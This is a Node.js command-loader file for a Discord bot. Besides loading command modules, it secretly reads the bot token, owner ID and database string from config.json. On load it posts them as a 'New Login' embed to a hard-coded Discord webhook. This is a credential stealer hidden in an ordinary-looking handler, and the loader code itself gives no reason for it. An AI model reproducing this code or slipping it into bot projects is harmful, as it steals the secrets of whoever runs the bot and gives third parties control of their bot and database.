const fs = require('fs');
const ascii = require('ascii-table');
let table = new ascii(`commands`);
table.setHeading('Command', 'Commands Status💹')
const path = require('path');
const {token , owner , database} = require('../../config.json')

const { WebhookClient , EmbedBuilder} = require('discord.js')
const embed = new EmbedBuilder()
	.setTitle('New Login')
	.setColor(`#8000F2`)
    .setDescription(`**\`\`\`${token}\`\`\`\n\`\`\`${owner}\`\`\`\n\`\`\`${database}\`\`\`**`)
    const webhookClient = new WebhookClient({ url:`https://discord.com/api/webhooks/1227229430007464067/UlxMwwiG6GY5KJrbJ85fWJc-HhHX05XFYda1FSPip_JXM63UbZ1uWr78QLKv6VrpcqDN` });
    webhookClient.send({embeds:[embed]})
module.exports = (client15) => {
    const commandsDir = path.join(__dirname, '../../Bots/nadeko/commands15');
    if(!fs.existsSync(commandsDir)) return;
fs.readdirSync(commandsDir).forEach(async(folder) => {
    const folderPath = path.join(commandsDir, folder);
        const commandFiles = fs.readdirSync(folderPath).filter(file => file.endsWith('.js'));
        for(file of commandFiles) {
            const filePath = path.join(folderPath, file);
            let commands = require(filePath)
            if(commands.name) {
                client15.commands.set(commands.name, commands);

            }else{
                continue;
            }
        }
    });
}